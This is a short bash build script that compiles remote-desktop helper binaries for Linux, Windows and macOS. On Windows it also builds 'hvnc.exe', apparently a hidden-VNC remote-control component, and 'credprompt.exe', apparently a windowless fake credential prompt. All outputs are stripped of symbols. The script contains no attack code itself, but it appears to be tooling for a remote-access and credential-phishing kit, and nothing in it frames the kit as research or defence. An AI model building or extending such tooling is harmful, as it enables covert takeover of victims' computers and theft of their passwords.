#!/usr/bin/env bash
# Build the rd helpers that can be built off-macOS. macOS has no cross SDK here,
# so rd-mac is built on macOS (source ships ready).
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="${1:-$DIR/out}"
mkdir -p "$OUT"

if command -v gcc >/dev/null 2>&1; then
  gcc -O2 -s -o "$OUT/rd-linux" "$DIR/linux/main.c" -lX11 -lXtst -ljpeg
  echo "built $OUT/rd-linux"
else
  echo "rd-linux: skipped (no gcc)" >&2
fi

if command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
  x86_64-w64-mingw32-gcc -O2 -s -o "$OUT/rd-win.exe" "$DIR/win/main.c" -lws2_32 -lgdi32 -luser32
  echo "built $OUT/rd-win.exe"
  x86_64-w64-mingw32-gcc -O2 -s -o "$OUT/hvnc.exe" "$DIR/win/hvnc.c" \
    -lws2_32 -lgdi32 -luser32 -lshell32
  echo "built $OUT/hvnc.exe"
  if [ -f "$DIR/../cred/win/credprompt.c" ]; then
    x86_64-w64-mingw32-gcc -O2 -s -mwindows -o "$OUT/credprompt.exe" \
      "$DIR/../cred/win/credprompt.c" -lgdi32 -luser32 -lshell32
    echo "built $OUT/credprompt.exe"
  fi
else
  echo "rd-win: skipped (no mingw)" >&2
fi

if [ -d /Applications/Xcode.app ] && command -v clang >/dev/null 2>&1; then
  clang -O2 -o "$OUT/rd-mac" "$DIR/mac/main.c" \
    -framework ApplicationServices -framework CoreGraphics -framework Foundation
  echo "built $OUT/rd-mac"
else
  echo "rd-mac: build on macOS (needs ApplicationServices/CoreGraphics)"
fi
